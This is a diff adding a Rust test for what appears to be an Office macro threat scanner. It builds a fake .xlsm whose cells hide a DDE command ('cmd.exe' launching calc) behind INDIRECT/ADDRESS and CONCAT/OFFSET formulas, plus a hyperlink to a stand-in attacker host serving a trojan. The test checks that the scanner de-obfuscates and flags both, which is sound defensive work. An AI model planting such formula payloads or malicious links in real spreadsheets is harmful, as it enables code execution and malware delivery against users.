@@ -2581,3 +2581,87 @@ fn e2e_ooxml_container_package_threat_inspection() {
         "DOCX should detect EmbeddedOlePackage"
     );
 }
+
+#[test]
+fn e2e_indirect_offset_address_and_concat_cell_threat_deobfuscation() {
+    let src = "Sub CleanProc()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "DynamicChainedProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["CleanProc"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/><Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/><Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/><Override PartName=\"/xl/worksheets/sheet2.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/></Types>";
+    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/></Relationships>";
+    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId2\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/><sheet name=\"Sheet2\" sheetId=\"2\" r:id=\"rId3\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"/></sheets></workbook>";
+    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+        <Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet2.xml\"/>\
+    </Relationships>";
+
+    // Sheet1:
+    // A1: "cmd", B1: ".exe", C1: "|'/c calc'!A0"
+    // D1: =INDIRECT(ADDRESS(1, 1)) & INDIRECT(ADDRESS(1, 2)) & INDIRECT(ADDRESS(1, 3))
+    // E1: =CONCAT(OFFSET(A1, 0, 0, 1, 3))
+    // F1: =HYPERLINK(INDIRECT("Sheet2!A1"), "ClickHere")
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
+        <row r=\"1\">\
+            <c r=\"A1\" t=\"inlineStr\"><is><t>cmd</t></is></c>\
+            <c r=\"B1\" t=\"inlineStr\"><is><t>.exe</t></is></c>\
+            <c r=\"C1\" t=\"inlineStr\"><is><t>|'/c calc'!A0</t></is></c>\
+            <c r=\"D1\"><f>=INDIRECT(ADDRESS(1, 1)) &amp; INDIRECT(ADDRESS(1, 2)) &amp; INDIRECT(ADDRESS(1, 3))</f></c>\
+            <c r=\"E1\"><f>=CONCAT(OFFSET(A1, 0, 0, 1, 3))</f></c>\
+            <c r=\"F1\"><f>=HYPERLINK(INDIRECT(&quot;Sheet2!A1&quot;), &quot;ClickHere&quot;)</f></c>\
+        </row>\
+    </sheetData></worksheet>";
+
+    // Sheet2:
+    // A1: "http://attacker.example.com/trojan.exe"
+    let sheet2 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>\
+        <row r=\"1\">\
+            <c r=\"A1\" t=\"inlineStr\"><is><t>http://attacker.example.com/trojan.exe</t></is></c>\
+        </row>\
+    </sheetData></worksheet>";
+
+    let xlsm = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", pkg_rels.as_bytes()),
+        ("xl/workbook.xml", wb.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+        ("xl/worksheets/sheet2.xml", sheet2.as_bytes()),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // Check D1: De-obfuscated DDE resolved via INDIRECT(ADDRESS(...))
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "D1 should resolve to DDE via INDIRECT + ADDRESS: {threats:?}"
+    );
+
+    // Check E1: De-obfuscated DDE resolved via CONCAT(OFFSET(...))
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "E1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c calc'!A0")),
+        "E1 should resolve to DDE via CONCAT + OFFSET: {threats:?}"
+    );
+
+    // Check F1: Suspicious Hyperlink resolved cross-sheet via INDIRECT("Sheet2!A1")
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "F1"
+            && t.threat_kind == "SuspiciousHyperlink"
+            && t.description
+                .contains("http://attacker.example.com/trojan.exe")),
+        "F1 should resolve cross-sheet hyperlink via INDIRECT: {threats:?}"
+    );
+}
